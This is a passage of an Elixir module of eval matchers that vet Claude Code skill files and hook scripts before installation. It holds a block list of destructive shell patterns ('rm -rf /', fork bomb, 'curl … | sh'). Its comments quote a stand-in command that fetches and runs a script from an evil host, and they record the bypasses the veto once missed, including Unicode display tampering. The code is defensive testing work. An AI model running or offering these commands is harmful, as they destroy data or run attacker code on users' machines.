defmodule Faber.Eval.Matchers do
  @moduledoc """
  Native Elixir port of the eval matchers (mirrors `python/faber_eval/matchers.py`).

  Each matcher is `(content, params) -> {pass?, evidence}` — pure, no I/O. Having these in Elixir
  lets the common structural-eval path run in-process (`Faber.Eval.Native`) with no `python3`
  process spawn; the Python sidecar remains for parity and as the future home for GEPA / trigger
  accuracy. Thresholds and patterns match the Python defaults so the two engines agree.
  """

  @vague_default ~w(general various etc sometimes might possibly)

  @dangerous_default [
    ~r/rm\s+-rf\s+\//,
    ~r/sudo\s+rm\b/,
    ~r/curl\s+[^|\n]*\|\s*(?:sudo\s+)?(?:ba)?sh/,
    ~r/:\(\)\s*\{/
  ]

  @safe_section_hints ["iron law", "anti-pattern", "red flag", "detection", "checklist", "gotcha"]

  @imperative ~r/^\s*(?:Run|Add|Create|Check|Read|Use|Set|Write|Install|Configure|Verify|Ensure|Avoid|Prefer|Call|Make|Define|Update|Remove|Replace|Apply|Pass|Return|Build|Test|Fix|Trace|Inspect|Confirm|Mark|Stage|Commit|Render|Parse|Score|Propose|Gate|Keep|Revert|Stop|Load|Skip|Move|Spawn|Group|Rank|Detect|Compute|Scan|Mine|Wire|Open|Close|Start|Find|List)\b/

  @concrete [
    ~r/`[^`]+`/,
    ~r/^\s*\|/,
    ~r/\w+\.\w+\.\w+/,
    ~r/\/\w+[\/\w]*\.\w+/,
    ~r/--\w+/,
    ~r/^\s*-\s*\[\s*\]/
  ]

  # ── frontmatter / sections ─────────────────────────────────────────────────

  @doc "Split a `---` frontmatter block from the body. `{fm_map, body}` (`{%{}, content}` if none)."
  @spec split_frontmatter(String.t()) :: {map(), String.t()}
  def split_frontmatter(content) do
    {fm, body} = split_raw(content)
    {fm |> String.split("\n") |> parse_fields(), body}
  end

  # The unparsed split: `{frontmatter_text, body}`, or `{"", content}` when there is no frontmatter.
  # Split out from `split_frontmatter/1` (whose contract is unchanged) because the safety scan needs
  # the RAW frontmatter text: `parse_fields/1` keeps only the `key: value` lines it understands and
  # silently drops everything else — block scalars, list items, continuations. Handing a safety check
  # a map built by a lossy parser rebuilds the empty-haystack vacuous pass one layer up: the payload
  # simply isn't in the map to be found. Every other matcher wants the parsed fields and calls
  # `split_frontmatter/1`.
  defp split_raw(content) do
    lines = String.split(content, "\n")

    with ["---" | rest] <- lines,
         idx when is_integer(idx) <- Enum.find_index(rest, &(String.trim(&1) == "---")) do
      body = rest |> Enum.drop(idx + 1) |> Enum.join("\n") |> String.replace(~r/\A\n+/, "")
      {rest |> Enum.take(idx) |> Enum.join("\n"), body}
    else
      _ -> {"", content}
    end
  end

  defp parse_fields(lines) do
    Enum.reduce(lines, %{}, fn line, acc ->
      case Regex.run(~r/^([A-Za-z0-9_-]+):\s*(.*)$/, line) do
        [_, key, val] -> Map.put(acc, key, unquote_val(String.trim(val)))
        _ -> acc
      end
    end)
  end

  defp unquote_val(<<q, _::binary>> = v) when q in [?", ?'] do
    if String.length(v) >= 2 and String.last(v) == <<q>>, do: String.slice(v, 1..-2//1), else: v
  end

  defp unquote_val(v), do: v

  @doc "Return `[{heading, body_lines}, ...]` for `##`/`###` sections of `body`."
  @spec sections(String.t()) :: [{String.t(), [String.t()]}]
  def sections(body) do
    body |> regions() |> Enum.reject(fn {name, _} -> is_nil(name) end)
  end

  # Every line of `body`, grouped as `{heading_or_nil, lines}` — including the **pre-heading**
  # region (`nil`), which `sections/1` drops. Anything that must not miss content has to walk this,
  # not `sections/1`: the region between the H1 and the first `##` is where a skill's opening prose
  # goes (the renderer emits `# Title` right before `## Usage`), and a body with no headings at all
  # — a hook script — is *entirely* pre-heading, i.e. entirely invisible to `sections/1`.
  @spec regions(String.t()) :: [{String.t() | nil, [String.t()]}]
  defp regions(body) do
    body
    |> String.split("\n")
    |> Enum.reduce({nil, [], []}, fn line, {cur, buf, acc} ->
      case Regex.run(~r/^\#\#+\s+(.*)$/, line) do
        [_, name] -> {String.trim(name), [], push(acc, cur, buf)}
        _ -> {cur, [line | buf], acc}
      end
    end)
    |> close()
  end

  # A pre-heading region of pure whitespace is not a region (a body that opens on a heading).
  defp push(acc, nil, buf) do
    if Enum.any?(buf, &(String.trim(&1) != "")),
      do: [{nil, Enum.reverse(buf)} | acc],
      else: acc
  end

  defp push(acc, cur, buf), do: [{cur, Enum.reverse(buf)} | acc]
  defp close({cur, buf, acc}), do: Enum.reverse(push(acc, cur, buf))

  # ── structure ──────────────────────────────────────────────────────────────

  def section_exists(content, params) do
    section = params[:section]
    {_, body} = split_frontmatter(content)
    names = Enum.map(sections(body), &elem(&1, 0))

    if Enum.any?(names, &String.contains?(String.downcase(&1), String.downcase(section))) do
      {true, "Section '#{section}' found"}
    else
      {false, "Section '#{section}' missing. Available: #{inspect(names)}"}
    end
  end

  def max_section_lines(content, params) do
    max = params[:max] || 40
    {_, body} = split_frontmatter(content)

    over =
      for {name, lines} <- sections(body),
          n = Enum.count(lines, &(String.trim(&1) != "")),
          n > max,
          do: {name, n}

    if over == [],
      do: {true, "All sections <= #{max} lines"},
      else: {false, "Over #{max}: #{inspect(over)}"}
  end

  def line_count(content, params) do
    target = params[:target] || 100
    tolerance = params[:tolerance] || 85
    {_, body} = split_frontmatter(content)
    n = length(String.split(body, "\n"))

    cond do
      n <= target -> {true, "#{n} lines (<= target #{target})"}
      n <= target + tolerance -> {true, "#{n} lines (within tolerance)"}
      true -> {false, "#{n} lines (over #{target + tolerance})"}
    end
  end

  def token_estimate(content, params) do
    max = params[:max_tokens] || 2000
    {_, body} = split_frontmatter(content)
    tokens = round(length(String.split(body, ~r/\s+/, trim: true)) / 0.75)

    if tokens <= max,
      do: {true, "~#{tokens} tokens"},
      else: {false, "~#{tokens} tokens (over #{max})"}
  end

  # ── frontmatter fields ───────────────────────────────────────────────────────

  def frontmatter_field(content, params) do
    field = to_string(params[:field])
    {fm, _} = split_frontmatter(content)

    cond do
      not Map.has_key?(fm, field) ->
        {false, "frontmatter missing '#{field}'"}

      params[:expected] && to_string(fm[field]) != to_string(params[:expected]) ->
        {false, "#{field}=#{inspect(fm[field])}"}

      true ->
        {true, "#{field} present"}
    end
  end

  def description_length(content, params) do
    min = params[:min] || 50
    max = params[:max] || 250
    {fm, _} = split_frontmatter(content)
    n = String.length(Map.get(fm, "description", ""))

    if min <= n and n <= max,
      do: {true, "description #{n} chars"},
      else: {false, "description #{n} chars (want #{min}-#{max})"}
  end

  # Generic by default: with no keyword list this is a neutral pass — an adapter supplies its
  # stack's domain keywords through eval params (mirrors `matchers.py description_keywords`).
  def description_keywords(content, params) do
    case params[:keywords] do
      keywords when is_list(keywords) and keywords != [] ->
        min = params[:min] || 3
        {fm, _} = split_frontmatter(content)
        desc = fm |> Map.get("description", "") |> String.downcase()

        hits =
          Enum.filter(keywords, fn k ->
            is_binary(k) and String.contains?(desc, String.downcase(k))
          end)

        if length(hits) >= min,
          do: {true, "#{length(hits)} domain keywords: #{inspect(hits)}"},
          else: {false, "only #{length(hits)} domain keywords (want >= #{min})"}

      _ ->
        {true, "no keyword list configured (skipped)"}
    end
  end

  # `forbidden` is pack-supplied YAML, i.e. untrusted input, and `Regex.escape/1` **raises** on a
  # non-binary — so `- 42` (an unquoted YAML scalar, a typo rather than an attack) took down the eval
  # mid-scan with a FunctionClauseError instead of failing the check. Reproduced end-to-end: the pack
  # passes `Adapter.validate/1`, which checks `eval.yaml`'s mode/entrypoints/root and never looks
  # inside a dimension's check params.
  #
  # Fail closed, exactly like the neighbouring `compile_pattern/1`: an unusable rule is a FAILED
  # check, never a crash and never a silent skip. A raise here aborts the whole score; a `false`
  # says which entries are unusable and lets the gate refuse honestly.
  def description_no_vague(content, params) do
    forbidden = params[:forbidden] || @vague_default
    {fm, _} = split_frontmatter(content)
    desc = fm |> Map.get("description", "") |> String.downcase()

    with {:ok, words} <- forbidden_words(forbidden) do
      found = Enum.filter(words, &Regex.match?(~r/\b#{Regex.escape(&1)}\b/, desc))

      if found == [],
        do: {true, "no vague words"},
        else: {false, "vague words: #{inspect(found)}"}
    end
  end

  # A non-list `forbidden` fails too: `Enum.filter/2` on a bare string raises Protocol.UndefinedError,
  # which is the same outage wearing a different exception.
  defp forbidden_words(forbidden) when is_list(forbidden) do
    case Enum.reject(forbidden, &is_binary/1) do
      [] ->
        {:ok, forbidden}

      bad ->
        # `charlists: :as_lists` so a YAML `- 42` reports `[42]` and not `~c"*"` — the default
        # inspect prints a list of small integers as a charlist, which is the least useful possible
        # thing to tell someone debugging their pack.
        {false,
         "invalid forbidden entries (each must be a string): " <>
           inspect(bad, charlists: :as_lists)}
    end
  end

  defp forbidden_words(other),
    do: {false, "invalid forbidden list (must be a list of strings): #{inspect(other)}"}

  def description_structure(content, _params) do
    {fm, _} = split_frontmatter(content)
    desc = Map.get(fm, "description", "")
    # "What" = starts with a capitalized word of ≥2 chars. `[\w+-]` (not `[a-z]`) so real stack
    # vocabulary passes — "GenServer…", "LiveView…", "OTP…", "N+1…" — while a bare "A " still
    # fails. Keep in lockstep with python/faber_eval/matchers.py (parity test pins both).
    has_what = Regex.match?(~r/^[A-Z][\w+-]+\s/, desc)
    has_when = Regex.match?(~r/\b[Uu]se\s+(?:when|after|for|to)\b/, desc)

    if has_what and has_when,
      do: {true, "has what + when"},
      else: {false, "what=#{has_what} when=#{has_when}"}
  end

  # ── content search ────────────────────────────────────────────────────────────

  # `pattern` comes from an untrusted adapter pack — compile non-bang and fail closed to a failed
  # check on a bad regex, never raise. (The Python side has no such guard and would crash the
  # sidecar; on valid patterns the two agree.)
  def content_present(content, params) do
    with {:ok, re} <- compile_pattern(params[:pattern]) do
      if Regex.match?(re, content),
        do: {true, "pattern present: #{params[:pattern]}"},
        else: {false, "pattern absent: #{params[:pattern]}"}
    end
  end

  def content_absent(content, params) do
    with {:ok, re} <- compile_pattern(params[:pattern]) do
      case Regex.run(re, content) do
        nil -> {true, "pattern absent: #{params[:pattern]}"}
        [match | _] -> {false, "forbidden pattern present: #{inspect(match)}"}
      end
    end
  end

  defp compile_pattern(pattern) when is_binary(pattern) do
    case Regex.compile(pattern) do
      {:ok, re} -> {:ok, re}
      {:error, _} -> {false, "invalid pattern: #{inspect(pattern)}"}
    end
  end

  defp compile_pattern(other), do: {false, "invalid pattern: #{inspect(other)}"}

  # ── safety ───────────────────────────────────────────────────────────────────

  def has_iron_laws(content, params) do
    min = params[:min_count] || 1
    {_, body} = split_frontmatter(content)

    candidates =
      Enum.filter(sections(body), fn {n, _} ->
        String.contains?(String.downcase(n), "iron law")
      end)

    case candidates do
      [] ->
        {false, "no Iron Laws section"}

      _ ->
        items = candidates |> Enum.map(fn {_, lines} -> count_items(lines) end) |> Enum.max()

        if items >= min,
          do: {true, "#{items} Iron Laws"},
          else: {false, "only #{items} Iron Laws (want #{min})"}
    end
  end

  defp count_items(lines),
    do: Enum.count(lines, &Regex.match?(~r/^\s*(?:\d+[\.\)]\s+|[-*]\s+)/, &1))

  def no_dangerous_patterns(content, params) do
    # NOT `params[:patterns] || @dangerous_default`: `[]` is **truthy in Elixir**, so an empty list
    # survived the `||` and became an empty regex set — `Enum.find([], …)` is `nil`, i.e. `{true,
    # "no dangerous patterns"}` on an artifact containing `rm -rf /`. The assertion was present AND
    # passing, so it read as a clean safety score rather than a skipped check. That is the same
    # vacuous-pass class as the empty-haystack bug this function was just fixed for, one config key
    # away, and reachable from an untrusted pack's `eval.yaml`.
    #
    # It was also a silent **native↔sidecar divergence**: Python's `patterns or _DANGEROUS_DEFAULT`
    # falls back correctly because `[]` is *falsy* there. Restoring the fallback restores parity.
    #
    # An empty pattern list can never mean "nothing is dangerous here" — for a safety check the only
    # safe reading of "no patterns configured" is "use the engine's".
    patterns =
      case params[:patterns] do
        list when is_list(list) and list != [] -> list
        _ -> @dangerous_default
      end

    # The frontmatter is scanned too, and this is not a detail: it used to be dropped outright
    # (`split_frontmatter/1` returns only the body), so `description: … rm -rf / …` was invisible
    # here. Reproduced before fixing — a well-formed skill scored **composite 1.0, passed, vetoed:
    # []**, byte-identical in score to the same skill with a benign description, and installed. The
    # payload cost the attacker exactly nothing, in the one field an agent reliably loads into
    # context to decide whether to run the skill at all.
    {fm, body} = split_raw(content)

    # Two haystacks because the exemptions differ; both are searched. The frontmatter is taken raw
    # and whole — no safe-section exemption (it has no headings, so it can announce nothing) and no
    # table filter (a leading `|` there is a YAML block scalar, not a table row).
    #
    # `regions/1`, not `sections/1`: this is the gate deciding what gets written into the user's
    # `~/.claude/skills`, so it must search the *whole* body. Searching `sections/1` let a valid
    # SKILL.md carrying `rm -rf /` between its H1 and first `##` score a clean pass, and made any
    # heading-less body (a hook script) a vacuous pass against an empty haystack.
    #
    # `exempt_safe_sections: false` turns the safe-section exemption OFF, and the hook eval set sets
    # it. The exemption is a **prose** concept — a skill listing `rm -rf /` under "## Anti-patterns"
    # is documenting it, not running it. In an executable artifact there is no such distinction: every
    # line runs, and `##` is just an ordinary shell comment. Reproduced before adding this: a hook
    # script of `#!/usr/bin/env bash` + `## Anti-patterns` + `rm -rf /` scored `{true, "no dangerous
    # patterns"}` — the veto, defeated by a comment.
    body_haystack = body_haystack(body, Map.get(params, :exempt_safe_sections, true))

    haystack = fm <> "\n" <> body_haystack

    # `patterns` may come from an untrusted adapter pack as YAML strings (not compiled `%Regex{}`),
    # so normalize each fail-closed: a bad regex is a failed safety check, never a raise mid-scan.
    with {:ok, regexes} <- compile_patterns(patterns) do
      case Enum.find(regexes, &Regex.match?(&1, haystack)) do
        nil -> {true, "no dangerous patterns"}
        pat -> {false, "dangerous pattern: #{inspect(Regex.source(pat))}"}
      end
    end
  end

  # ## The haystack, per artifact kind — and why the split is structural rather than per-transform
  #
  # `exempt_safe_sections: false` means "this artifact is EXECUTABLE" (only the hook set passes it).
  # An executable artifact therefore gets **no markdown-shaped transform at all**, because it is not
  # markdown. That is the whole clause below, and the shape is deliberate.
  #
  # Gating each markdown transform on the flag one at a time was tried first and is the wrong shape.
  # The `##` bypass was fixed that way in the previous session; B2 (`|`) sat one line below it,
  # unnoticed, the entire time. Enumerating this pipeline's markdown assumptions found three, and
  # the third was only visible after the second was "fixed":
  #
  #   1. `reject_safe_sections` — `##` is a heading AND a shell comment. (Gated last session.)
  #   2. the `|` line filter — a table row AND a pipeline continuation. (B2.)
  #   3. `regions/1` **consumes the heading line itself** — a `##` line becomes a region *name* and
  #      never reaches the haystack. Harmless for a skill; on a script it is a third bypass, and it
  #      is the one that would have been created BY the fix for (2): splicing continuations before
  #      `regions/1` turns `## x \` + `\n rm -rf /` into one `##` line, which `regions/1` then eats.
  #      Verified against real bash first — a trailing backslash does NOT continue a comment, so
  #      that `rm -rf /` genuinely executes.
  #
  # Three instances of one mistake, the third self-inflicted while fixing the second, is the
  # argument against instance-gating. So the executable path skips the pipeline entirely: any
  # markdown transform added here later cannot silently apply to a script, without the author
  # having to notice this comment.
  #
  # `nil` reads as `false`, i.e. EXECUTABLE — the strict side. Matching the literal `false` alone put
  # `nil` on the markdown path, which is the *permissive* one, so an explicit
  # `exempt_safe_sections: nil` exempted `## Anti-patterns` + `curl … | sh` and the veto passed it.
  # The sidecar never had this: Python's `if exempt_safe_sections:` reads `None` as falsy, so the two
  # engines disagreed on `nil` with **native** as the lenient one. Parity alone would not have caught
  # it — no fixture passed `nil`, which is exactly why the suite was green on it. An unset flag must
  # never be the reason a payload is exempt.
  defp body_haystack(body, exempt) when exempt in [false, nil], do: splice_continuations(body)

  defp body_haystack(body, _true) do
    body
    |> regions()
    |> Enum.reject(fn {name, _} -> safe_section?(name) end)
    |> Enum.flat_map(fn {_, lines} ->
      # A leading `|` is a markdown table row — prose, and prose may name a danger.
      Enum.reject(lines, &String.starts_with?(String.trim(&1), "|"))
    end)
    |> Enum.join("\n")
  end

  # Read an executable artifact the way the shell reads it: a backslash-newline is a **line
  # continuation**, spliced away before the shell parses anything, so `curl …\` + `\n|sh` IS the
  # single command `curl … |sh`. The patterns are written against whole commands, so they must see
  # whole commands.
  #
  # This — not the table-row filter — is what B2 actually turned on, and the distinction is worth
  # recording because it inverts the review's account. "The `|` filter creates the hole" is
  # imprecise: `@dangerous_default`'s pattern is `curl\s+[^|\n]*\|\s*(?:ba)?sh`, whose `[^|\n]*`
  # cannot cross a newline, so with the filter OFF and both lines in the haystack it STILL does not
  # match. Measured at da26a8f:
  #
  #     curl -s https://evil.tld/p.sh | sh          → vetoed
  #     curl -s https://evil.tld/p.sh \ + \n|sh     → filter ON: passes · filter OFF: STILL passes
  #     …spliced                                    → vetoed
  #
  # Removing the filter alone would have closed nothing while looking like a fix.
  #
  # Generic on purpose: it repairs EVERY pattern against continuation-splitting, not just curl — a
  # blocklist any author defeats with a `\` at end-of-line is not a blocklist. It can only ever join
  # lines, never drop text, so it cannot hide a payload from a pattern. (A pack supplying a
  # `^`-anchored pattern should know its anchor binds to the spliced command, not the source line.)
  defp splice_continuations(body), do: String.replace(body, ~r/\\\n[ \t]*/, " ")

  # `@safe_section_hints` exempts a section that *announces* it documents dangerous patterns — a
  # skill listing `rm -rf /` under "Anti-patterns" is doing its job. Unheaded prose announces
  # nothing, so the pre-heading region is never exempt.
  defp safe_section?(nil), do: false

  defp safe_section?(name) do
    downcased = String.downcase(name)
    Enum.any?(@safe_section_hints, &String.contains?(downcased, &1))
  end

  # Accepts a mix of compiled `%Regex{}` (e.g. `@dangerous_default`) and strings from a pack's
  # YAML. Short-circuits to a failed check on the first uncompilable pattern.
  defp compile_patterns(patterns) do
    Enum.reduce_while(patterns, {:ok, []}, fn pat, {:ok, acc} ->
      case normalize_pattern(pat) do
        {:ok, re} -> {:cont, {:ok, [re | acc]}}
        {false, _} = failed -> {:halt, failed}
      end
    end)
    |> case do
      {:ok, acc} -> {:ok, Enum.reverse(acc)}
      failed -> failed
    end
  end

  defp normalize_pattern(%Regex{} = re), do: {:ok, re}
  defp normalize_pattern(pat) when is_binary(pat), do: compile_pattern(pat)
  defp normalize_pattern(other), do: {false, "invalid pattern: #{inspect(other)}"}

  # ── clarity / specificity ─────────────────────────────────────────────────────

  def has_examples(content, params) do
    min_blocks = params[:min_blocks] || 1
    min_lines = params[:min_lines] || 2
    {_, body} = split_frontmatter(content)

    good =
      Regex.scan(~r/```[\w]*\n(.*?)```/s, body)
      |> Enum.map(fn [_, inner] ->
        Enum.count(String.split(inner, "\n"), &(String.trim(&1) != ""))
      end)
      |> Enum.count(&(&1 >= min_lines))

    if good >= min_blocks,
      do: {true, "#{good} example blocks"},
      else: {false, "only #{good} example blocks"}
  end

  def action_density(content, params) do
    min_ratio = params[:min_ratio] || 0.25
    {_, body} = split_frontmatter(content)

    lines =
      body
      |> String.split("\n")
      |> Enum.filter(fn l ->
        t = String.trim(l)
        t != "" and not String.starts_with?(t, "#") and not String.starts_with?(t, "```")
      end)

    case lines do
      [] ->
        {false, "no content lines"}

      _ ->
        actionable = Enum.count(lines, &actionable?/1)
        ratio = actionable / length(lines)

        if ratio >= min_ratio,
          do: {true, "action density #{fmt(ratio)}"},
          else: {false, "action density #{fmt(ratio)} (want #{min_ratio})"}
    end
  end

  defp actionable?(line) do
    Regex.match?(@imperative, line) or
      Regex.match?(~r/^\s*\d+[\.\)]\s+/, line) or
      Regex.match?(~r/^\s*[-*]\s+\*\*/, line) or
      (String.starts_with?(String.trim(line), "|") and length(String.split(line, "|")) >= 3)
  end

  def specificity_ratio(content, params) do
    min_ratio = params[:min_ratio] || 0.15
    {_, body} = split_frontmatter(content)
    lines = body |> String.split("\n") |> Enum.filter(&(String.trim(&1) != ""))

    case lines do
      [] ->
        {false, "no content"}

      _ ->
        concrete = Enum.count(lines, fn l -> Enum.any?(@concrete, &Regex.match?(&1, l)) end)
        ratio = concrete / length(lines)

        if ratio >= min_ratio,
          do: {true, "specificity #{fmt(ratio)}"},
          else: {false, "specificity #{fmt(ratio)} (want #{min_ratio})"}
    end
  end

  # ── accuracy (cross-reference resolution) ─────────────────────────────────────
  #
  # The plugin's accuracy matchers list the filesystem (os.listdir/isfile) to resolve refs. To keep
  # these matchers PURE (the module's contract) and the native↔sidecar parity exact, Faber instead
  # validates refs against caller-supplied *known-sets* — plain lists threaded in via `params`. The
  # filesystem walk happens once at the boundary (`Faber.Eval`, from the adapter/install tree) and
  # the resolved names flow in as data. Without a known-set the check neutral-passes (it cannot
  # validate, and must never block the gate for missing context) — mirroring the reference's own
  # "cannot locate plugin root — skipping" behavior.

  @builtin_agents ~w(general-purpose Explore Plan code-simplifier)

  @doc "Own-skill `references/<file>` paths resolve against `:known_files` (basenames)."
  def valid_file_refs(content, params) do
    # Cross-skill refs (`other-skill/references/x.md`) are someone else's to validate — exclude them.
    cross =
      ~r{([\w-]+)/references/([\w.-]+\.md)}
      |> Regex.scan(content)
      |> Enum.reject(fn [_, prefix, _] -> prefix in ["CLAUDE_SKILL_DIR}", "CLAUDE_SKILL_DIR"] end)
      |> Enum.map(fn [_, _, file] -> file end)
      |> MapSet.new()

    refs =
      ~r{(?:CLAUDE_SKILL_DIR\}?/)?references/([\w.-]+\.md)}
      |> Regex.scan(content)
      |> Enum.map(fn [_, file] -> file end)
      |> Enum.uniq()
      |> Enum.reject(&MapSet.member?(cross, &1))

    validate_refs(refs, params[:known_files], "reference file", &Path.basename/1)
  end

  @doc "Skill refs (`/ns:name`, `[[name]]`, `` `name` skill``) resolve against `:known_skills`."
  def valid_skill_refs(content, params) do
    refs =
      regex_names(~r{(?<!/)/\w[\w-]*:(\w[\w-]*)}, content) ++
        regex_names(~r{\[\[([\w-]+)\]\]}, content) ++
        regex_names(~r{`([\w-]+)`\s+skill}, content)

    validate_refs(Enum.uniq(refs), params[:known_skills], "skill", & &1)
  end

  @doc "Agent refs (`subagent_type:`, `` `name-role` ``) resolve against `:known_agents` + built-ins."
  def valid_agent_refs(content, params) do
    builtin = params[:builtin_agents] || @builtin_agents

    refs =
      regex_names(~r{subagent_type[=:]\s*["']?([\w-]+)}, content) ++
        regex_names(
          ~r{`([\w-]+-(?:reviewer|analyzer|architect|validator|runner|specialist|advisor|judge|supervisor|orchestrator|researcher|tracer))`},
          content
        )

    refs = refs |> Enum.uniq() |> Enum.reject(&(&1 in builtin))
    validate_refs(refs, params[:known_agents], "agent", & &1)
  end

  defp regex_names(re, content), do: re |> Regex.scan(content) |> Enum.map(&List.last/1)

  # nil known-set → neutral pass (cannot validate); empty refs → pass; else membership check.
  defp validate_refs(_refs, nil, label, _norm),
    do: {true, "no #{label} index supplied — skipping"}

  defp validate_refs([], _known, label, _norm), do: {true, "no #{label} references found"}

  defp validate_refs(refs, known, label, norm) do
    known_set = MapSet.new(known, norm)
    missing = Enum.reject(refs, &MapSet.member?(known_set, &1))

    if missing == [],
      do: {true, "all #{length(refs)} #{label} references valid"},
      else: {false, "missing #{label}s: #{inspect(Enum.sort(missing))}"}
  end

  # ── hook matchers ──────────────────────────────────────────────────────────
  #
  # Hooks are scored by their own set (`Faber.Eval.Native.hook_eval/0`), not the skill set: a shell
  # script has no frontmatter, no Iron Laws and no prose, so `specificity_ratio` and friends measure
  # nothing on one and score it ~0.15–0.30 against a 0.75 gate. These ask the questions a hook can
  # actually answer — will it run, will it fire in the right place, is it safe.

  @doc """
  A hook script must open with a `#!` shebang: Claude Code executes the file, so without one it is
  at the mercy of the caller's shell. Line 1 only — a `#!` anywhere else is just a comment.
  """
  @spec hook_shebang(String.t(), map()) :: {boolean(), String.t()}
  def hook_shebang(content, _params) do
    case String.split(content, "\n", parts: 2) do
      ["#!" <> interpreter | _] -> {true, "shebang: #!#{String.trim(interpreter)}"}
      [first | _] -> {false, "no shebang on line 1: #{inspect(String.slice(first, 0, 40))}"}
    end
  end

  @doc """
  An executable artifact carries **no Unicode format characters** (`\\p{Cf}`: bidi overrides,
  zero-width joiners/spaces). A veto, not a score, and deliberately not a strip.

  The whole install posture rests on a person reading ~15 lines of bash: the veto is a four-regex
  blocklist that 7 of 8 hand-written vectors walk past, and the thing that actually catches them is
  the human. `\\p{Cf}` changes what a terminal *displays* without changing what bash *executes* — so
  it does not evade the boundary, it attacks it. The reader confirms one script and runs another.

  **Why veto rather than strip.** `Propose.comment_safe/1` strips these from the seven tokens that
  land in `#` comments and cannot execute, and skips `{{script}}`, which bash runs. Extending the
  strip there was the obvious fix and is the wrong one: stripping mutates the bytes *after* the eval
  scored them and *after* the human read them — a smaller copy of the very bug it would be fixing.
  Refusing is the only answer that keeps seen-bytes == scored-bytes == written-bytes. Sitting in
  `Faber.Eval`'s `@veto_checks` also covers the restore path for free, where there is no render to
  strip in.

  **Scoped to `kind: :hook`** (`Faber.Eval.veto_params/1` supplies it). Not squeamishness about
  scope: U+200D ZWJ *is* `Cf` and is how emoji are joined, so vetoing markdown on this would refuse
  an honest skill whose description contains 👨‍👩‍👧. In bash there is no such reading — a format
  character in a script is tampering under any grammar.
  """
  @spec hook_no_format_chars(String.t(), map()) :: {boolean(), String.t()}
  def hook_no_format_chars(content, params) do
    if params[:kind] == :hook do
      scan_format_chars(content)
    else
      {true, "not an executable artifact — format characters are text, not tampering"}
    end
  end

  defp scan_format_chars(content) do
    case Regex.run(~r/\p{Cf}/u, content) do
      nil ->
        {true, "no Unicode format characters"}

      [char] ->
        {false,
         "script contains a Unicode format character (U+#{codepoint(char)}) — it changes what " <>
           "the script LOOKS like without changing what it DOES, and a person reading this script " <>
           "is what stands between it and every matching tool call"}
    end
  end

  defp codepoint(<<cp::utf8>>),
    do: cp |> Integer.to_string(16) |> String.pad_leading(4, "0")

  # How a hook can read the tool call Claude Code pipes to it on stdin as JSON. A hook that never
  # reads stdin cannot know what it is deciding about — it can only make the same decision every
  # time, which is a hook that either blocks everything or does nothing.
  @stdin_reads [
    ~r/\$\(\s*cat\s*\)/,
    ~r/\bjq\b/,
    ~r/\bread\b\s+(?:-r\s+)?\w/,
    ~r|</dev/stdin|,
    ~r/\bcat\s*(?:-|<&0)\b/,
    ~r/\bpython3?\b[^\n]*\bjson\.load\b/
  ]

  # The events that hand the hook a tool call on stdin. `SessionStart`/`Stop` fire on the session,
  # not on a tool, so there is no tool call to read and demanding one would fail every such hook for
  # not doing something meaningless.
  @tool_call_events ~w(PreToolUse PostToolUse)

  @doc """
  A tool-call hook must read the tool call from stdin — Claude Code pipes it in as JSON. `jq`,
  `$(cat)`, `read`, `</dev/stdin` and an inline `json.load` all count.

  Scoped by `params[:event]` (injected by `Faber.Eval`): only `#{Enum.join(@tool_call_events, "/")}`
  receive a tool call, so other events neutral-pass. An absent event is treated as a tool-call hook —
  the conservative reading, since that is what Faber proposes.
  """
  @spec hook_reads_stdin(String.t(), map()) :: {boolean(), String.t()}
  def hook_reads_stdin(content, params) do
    event = params[:event]

    if is_binary(event) and event not in @tool_call_events do
      {true, "#{event} receives no tool call — stdin not required"}
    else
      # `code_only/1`, not `content`: a comment MENTIONING jq is not a script that RUNS jq. Found by
      # auditing this set rather than from a report, and it is the least adversarial member of the
      # class — the description "Use jq to check the command before it runs" is exactly what an
      # honest jq-based hook would say. Measured at da26a8f: that description, on a script whose
      # whole body is `echo 'always fine'; exit 0`, scored `{true, "reads stdin"}` and the proposal
      # scored **composite 1.0, passed: true**. A hook that cannot see its input is precisely what
      # this dimension exists to reject, and it was passing them at a perfect score.
      case Enum.find(@stdin_reads, &Regex.match?(&1, code_only(content))) do
        nil ->
          {false, "never reads stdin — the hook can't see the tool call it is deciding about"}

        re ->
          {true, "reads stdin: #{inspect(Regex.source(re))}"}
      end
    end
  end

  # The script with its comments removed, read the way the shell reads it.
  #
  # Note the deliberate asymmetry with `no_dangerous_patterns`, which strips NOTHING and searches
  # comments too. Both directions are the conservative one for their own question, and that is the
  # rule to keep when adding a matcher here:
  #
  #   * a **veto** asks "is anything dangerous present?" → search MORE; a payload hiding in a
  #     comment must still be caught (a `#` is only a comment until someone edits the line above it).
  #   * a **necessary condition** asks "does the script definitely do X?" → search LESS; text in a
  #     comment is not evidence that the code does anything.
  #
  # Each errs toward rejecting the artifact. Comments are dropped before continuations are spliced,
  # matching bash: a trailing backslash does NOT continue a comment (verified against real bash),
  # so the line after `# … \` is code and must survive.
  #
  # Whole-line AND trailing comments. Rejecting only lines whose trimmed start is `#` left the same
  # bug one column to the right: `echo 'always fine'   # use jq to inspect the command` scored
  # `{true, "reads stdin"}` on a script that never reads stdin. That is the da26a8f finding — which
  # fixed *leading* comments — with the comment moved to the end of the line. The class is "a comment
  # mentioning jq is not a script that runs jq"; the instance was the only thing fixed.
  defp code_only(content) do
    content
    |> String.split("\n")
    |> Enum.reject(&String.starts_with?(String.trim(&1), "#"))
    |> Enum.map_join("\n", &strip_trailing_comment/1)
    |> splice_continuations()
  end

  # Drop a trailing `#` comment, reading the line the way bash does. `#` opens a comment only when it
  # is **outside every quote** and **starts a word** — so `echo "# not a comment"` keeps its `#`, and
  # so does `echo a#b` (a `#` mid-word is a literal).
  #
  # Quote-tracking rather than "skip any line containing a quote", which was the first design and is
  # too weak to fix its own reproduction: the measured S-1 line carries `'…'`, so a quote-blind rule
  # skips it and the bug survives. The concern that motivated that rule is real and this handles it
  # directly — in `awk '{print $1 # x}' | jq -r .` the `#` is inside single quotes, so nothing is
  # stripped and the `jq` after it still counts. Erring toward *removing* text would reject an honest
  # hook; erring toward *keeping* it merely leaves the check generous. Tracking the quotes is what
  # avoids having to choose.
  defp strip_trailing_comment(line), do: scan_code(line, "", nil)

  # `quote` is the delimiter we are inside (`?'` / `?"`), or nil outside.
  defp scan_code("", acc, _quote), do: acc

  # A backslash escapes the next byte outside quotes (including a `#`, which then isn't a comment).
  defp scan_code(<<?\\, c::utf8, rest::binary>>, acc, nil),
    do: scan_code(rest, acc <> <<?\\, c::utf8>>, nil)

  # Closing the quote we're in. Matched before the opening clauses so `'` closes `'` rather than
